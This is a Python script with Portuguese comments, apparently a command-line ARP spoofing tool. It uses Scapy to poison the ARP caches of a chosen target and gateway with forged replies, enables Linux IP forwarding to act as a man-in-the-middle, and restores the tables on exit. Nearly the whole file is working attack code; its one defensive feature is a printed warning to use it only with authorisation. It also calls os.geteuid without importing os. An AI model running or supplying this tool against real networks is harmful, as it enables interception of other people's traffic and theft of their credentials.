import scapy.all as scapy
import time
import sys
import argparse
import subprocess

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = interface or scapy.conf.iface
        self.target_mac = None
        self.gateway_mac = None

    def get_mac(self, ip):
        """Descobre o endereço MAC de um IP via ARP."""
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        # srp envia pacotes na camada 2 (Ethernet). iface garante a interface correta.
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=self.iface)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None

    def spoof(self):
        """Executa o envenenamento ARP contínuo."""
        print(f"[*] Obtendo endereços MAC...")
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)

        if not self.target_mac or not self.gateway_mac:
            print("[!] Erro: Não foi possível obter os endereços MAC. Verifique os IPs e a conexão.")
            sys.exit(1)

        print(f"[+] MAC do Alvo ({self.target_ip}): {self.target_mac}")
        print(f"[+] MAC do Gateway ({self.gateway_ip}): {self.gateway_mac}")
        print(f"[*] Iniciando ARP Spoofing na interface {self.iface}... (Ctrl+C para parar)")

        # Pacotes ARP forjados (op=2 significa ARP Reply)
        # Dizemos ao alvo que o MAC do gateway é o nosso
        packet_to_target = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
        # Dizemos ao gateway que o MAC do alvo é o nosso
        packet_to_gateway = scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)

        try:
            while True:
                scapy.send(packet_to_target, verbose=False, iface=self.iface)
                scapy.send(packet_to_gateway, verbose=False, iface=self.iface)
                # Imprimir um ponto para mostrar que o script está vivo
                sys.stdout.write("."); sys.stdout.flush()
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[!] Interrupção detectada. Restaurando redes...")
            self.restore()
            print("[+] Redes restauradas. Saindo.")

    def restore(self):
        """Restaura as tabelas ARP originais para não quebrar a rede."""
        print("[*] Enviando pacotes de restauração...")
        # Reobtemos os MACs reais caso tenham mudado (boa prática)
        target_mac = self.get_mac(self.target_ip) or self.target_mac
        gateway_mac = self.get_mac(self.gateway_ip) or self.gateway_mac

        if target_mac and gateway_mac:
            # Enviamos os pacotes corretos várias vezes para garantir que a tabela seja atualizada
            restore_target = scapy.ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac)
            restore_gateway = scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.target_ip, hwsrc=target_mac)
            
            for _ in range(5):
                scapy.send(restore_target, verbose=False, iface=self.iface)
                scapy.send(restore_gateway, verbose=False, iface=self.iface)
                time.sleep(0.5)

def enable_ip_forwarding():
    """Habilita o encaminhamento de pacotes no Linux (necessário para MITM)."""
    try:
        # Verifica se é Linux
        if sys.platform.startswith("linux"):
            subprocess.check_call(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
            print("[+] Encaminhamento IP (ip_forward) habilitado.")
        else:
            print("[!] Aviso: Habilite o encaminhamento IP manualmente no seu sistema.")
    except Exception as e:
        print(f"[!] Falha ao habilitar ip_forward (requer root): {e}")

if __name__ == "__main__":
    # Aviso Legal e Ético
    print("="*50)
    print(" AVISO: Use esta ferramenta apenas em redes próprias")
    print(" ou com autorização explícita e por escrito.")
    print("="*50)

    parser = argparse.ArgumentParser(description="Ferramenta de ARP Spoofing")
    parser.add_argument("-t", "--target", required=True, help="IP da máquina alvo")
    parser.add_argument("-g", "--gateway", required=True, help="IP do Gateway/Roteador")
    parser.add_argument("-i", "--interface", help="Interface de rede (ex: eth0, wlan0). Padrão: interface padrão do Scapy")
    
    args = parser.parse_args()

    # Requer privilégios de root para enviar pacotes raw
    if os.geteuid() != 0: # type: ignore
        print("[!] Erro: Este script requer privilégios de root (sudo).")
        sys.exit(1)

    enable_ip_forwarding()
    
    spoofer = ARPSpoofer(args.target, args.gateway, args.interface)
    spoofer.spoof()